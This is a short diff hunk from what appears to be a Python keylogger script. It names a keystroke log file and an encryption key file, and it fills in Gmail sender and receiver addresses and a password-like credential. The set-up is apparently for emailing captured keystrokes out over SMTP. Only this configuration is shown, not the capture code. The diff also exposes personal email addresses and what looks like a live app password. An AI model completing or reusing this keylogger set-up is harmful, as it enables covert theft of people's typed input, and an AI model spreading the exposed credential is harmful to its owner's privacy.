@@ -9,9 +9,9 @@ from datetime import datetime
 log_file = "encrypted_keystrokes.txt"
 key_file = "encryption.key"
 
-sender_email = ""
-receiver_email = ""
-email_password = ""
+sender_email = "girdharniketdigi@gmail.com"
+receiver_email = "niketgirdhar2004@gmail.com"
+email_password = "qfxx ugkd cmek wwgx"
 
 smtp_server = "smtp.gmail.com"
 smtp_port = 465
